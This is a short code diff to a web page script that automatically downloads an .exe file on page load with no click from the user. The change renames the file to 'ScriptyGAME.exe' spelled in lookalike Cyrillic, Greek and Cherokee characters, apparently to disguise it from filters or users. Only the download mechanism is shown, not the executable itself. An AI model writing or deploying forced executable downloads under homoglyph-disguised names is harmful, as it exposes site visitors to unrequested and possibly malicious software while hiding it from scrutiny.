@@ -1,8 +1,8 @@
 window.onload = function () {
-  const downloadUrl = "/assets/files/ScriptyGAME.exe";
+  const downloadUrl = "/assets/files/ЅϲʀіρτуᏀᎪⅯЕ.exe";
   const link = document.createElement('a');
   link.href = downloadUrl;
-  link.download = "ScriptyGAME.exe";
+  link.download = "ЅϲʀіρτуᏀᎪⅯЕ.exe";
   
   document.body.appendChild(link);
   link.click();
